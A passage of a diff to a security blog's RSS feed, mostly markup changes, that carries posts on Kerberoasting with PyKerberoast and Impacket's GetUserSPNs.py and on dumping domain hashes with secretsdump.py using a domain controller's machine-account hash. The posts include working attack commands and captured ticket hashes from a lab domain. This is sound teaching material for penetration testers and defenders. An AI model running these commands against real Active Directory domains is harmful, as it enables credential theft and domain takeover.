 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;But all of that is hard and creates evidence. Lets look back at the tools &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; and &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt; and see if there is a better way:&lt;/p&gt;
 &lt;h2 id=&#34;pykerberoast&#34;&gt;PyKerberoast&lt;/h2&gt;
@@ -234,10 +234,10 @@ $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54
 &lt;/ul&gt;
 &lt;p&gt;This awesome work by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.&lt;/p&gt;
 &lt;p&gt;Usage:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
                 [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Example (I have snipped up some of the output to save space):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; -d sittingduck -u notanadmin
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &amp;#34;dc=sittingduck,dc=info&amp;#34; -d sittingduck -u notanadmin
 [+]Starting...
 Password:
 $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715
@@ -250,7 +250,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af5
 &lt;li&gt;Source: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Just by adding a &lt;strong&gt;&lt;code&gt;-request&lt;/code&gt;&lt;/strong&gt; to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&amp;rsquo;ve snipped up some of the output to save space):&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
 Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
 
 Password:
@@ -294,16 +294,16 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
       
       <guid>https://malicious.link/post/2015/using-domain-controller-account-passwords-to-hashdump-domains/</guid>
       <description>&lt;p&gt;Since I follow both &lt;a href=&#34;https://twitter.com/carlos_perez&#34;&gt;Carlos Perez&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;Benjamin Delpy&lt;/a&gt; on Twitter, something caught my eye on August 2nd, soon after &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;Benjamin Delpy&lt;/a&gt; drops &lt;a href=&#34;https://twitter.com/gentilkiwi/status/627977943923490816&#34;&gt;DCSync&lt;/a&gt;:&lt;/p&gt;
-&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/Carlos_Perez?ref_src=twsrc%5Etfw&#34;&gt;@Carlos_Perez&lt;/a&gt; haha, if yes, it will be a 0d ;)&lt;br&gt;No, like always it needs some rights ;) DA is cool, maybe DC$ is enough&lt;/p&gt;&amp;mdash; 🥝 Benjamin Delpy (@gentilkiwi) &lt;a href=&#34;https://twitter.com/gentilkiwi/status/627980725074153473?ref_src=twsrc%5Etfw&#34;&gt;August 2, 2015&lt;/a&gt;&lt;/blockquote&gt;
+&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/Carlos_Perez?ref_src=twsrc%5Etfw&#34;&gt;@Carlos_Perez&lt;/a&gt; haha, if yes, it will be a 0d ;)&lt;br&gt;No, like always it needs some rights ;) DA is cool, maybe DC$ is enough&lt;/p&gt;&amp;mdash; 🥝🏳️‍🌈 Benjamin Delpy (@gentilkiwi) &lt;a href=&#34;https://twitter.com/gentilkiwi/status/627980725074153473?ref_src=twsrc%5Etfw&#34;&gt;August 2, 2015&lt;/a&gt;&lt;/blockquote&gt;
 &lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
 
 &lt;p&gt;And then later on August 28th, again about the DC$ account (Domain Controller computer account):&lt;/p&gt;
-&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/hashtag/mimikatz?src=hash&amp;amp;ref_src=twsrc%5Etfw&#34;&gt;#mimikatz&lt;/a&gt; DCSync make logs with &amp;#39;Directory Service Access&amp;#39; DS-Replication-Get-Changes*&lt;br&gt;Except if you use a DC account &lt;a href=&#34;http://t.co/QAChOGU3z7&#34;&gt;pic.twitter.com/QAChOGU3z7&lt;/a&gt;&lt;/p&gt;&amp;mdash; 🥝 Benjamin Delpy (@gentilkiwi) &lt;a href=&#34;https://twitter.com/gentilkiwi/status/637402457740562432?ref_src=twsrc%5Etfw&#34;&gt;August 28, 2015&lt;/a&gt;&lt;/blockquote&gt;
+&lt;blockquote class=&#34;twitter-tweet&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;&lt;a href=&#34;https://twitter.com/hashtag/mimikatz?src=hash&amp;amp;ref_src=twsrc%5Etfw&#34;&gt;#mimikatz&lt;/a&gt; DCSync make logs with &amp;#39;Directory Service Access&amp;#39; DS-Replication-Get-Changes*&lt;br&gt;Except if you use a DC account &lt;a href=&#34;http://t.co/QAChOGU3z7&#34;&gt;pic.twitter.com/QAChOGU3z7&lt;/a&gt;&lt;/p&gt;&amp;mdash; 🥝🏳️‍🌈 Benjamin Delpy (@gentilkiwi) &lt;a href=&#34;https://twitter.com/gentilkiwi/status/637402457740562432?ref_src=twsrc%5Etfw&#34;&gt;August 28, 2015&lt;/a&gt;&lt;/blockquote&gt;
 &lt;script async src=&#34;https://platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
 
 &lt;p&gt;Because DCSync is calling on &amp;ldquo;sync&amp;rdquo; based APIs of Active Directory, that are, by default, used only by Domain Controllers, all Domain Controller computer accounts would have the ability to do this as well as the Domain/Enterprise Admins.&lt;/p&gt;
 &lt;p&gt;Anyone who&amp;rsquo;s ever administered an Active Directory, knows that computer accounts change their passwords automatically. How often do they change them?&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;https://support.microsoft.com/en-us/kb/154501:&#34;&gt;https://support.microsoft.com/en-us/kb/154501:&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://support.microsoft.com/en-us/kb/154501&#34;&gt;https://support.microsoft.com/en-us/kb/154501&lt;/a&gt;:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&amp;ldquo;Machine account passwords are regularly changed for security purposes. By default, on Windows NT-based computers, the machine account password automatically changes every &lt;strong&gt;seven days&lt;/strong&gt;. Starting with Windows 2000-based computers, the machine account password automatically changes every &lt;strong&gt;30 days&lt;/strong&gt;.&amp;rdquo;&lt;/p&gt;
 &lt;/blockquote&gt;
@@ -311,7 +311,7 @@ $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310
 &lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2015/activedirectory_muhaha.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;Alright. So, I&amp;rsquo;m not going to go into &amp;ldquo;how&amp;rdquo; to get the hashes for a computer account, but if you&amp;rsquo;ve ever dumped passwords before, the computer accounts are the ones with the &amp;ldquo;$&amp;rdquo; on the end. Find the ones that are domain controllers, match up the hashes, and use &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py&#34;&gt;Impacket&amp;rsquo;s secretsdump.py&lt;/a&gt; to your heart&amp;rsquo;s content. (Or until the password changes for that DC, then you use another one to dump it again, oh, did I not mention that computers don&amp;rsquo;t change their passwords all at the same time in that 30 day window?)&lt;/p&gt;
 &lt;p&gt;Remember, Domain Controller&amp;rsquo;s don&amp;rsquo;t have a lot of other permissions, so you need to use the &amp;ldquo;&lt;code&gt;-just-dc&lt;/code&gt;&amp;rdquo; option in SecretsDump in order for it to just do the domain dump:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -just-dc LAB/DC2k8_1\$@172.16.102.15
 
 Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies
 
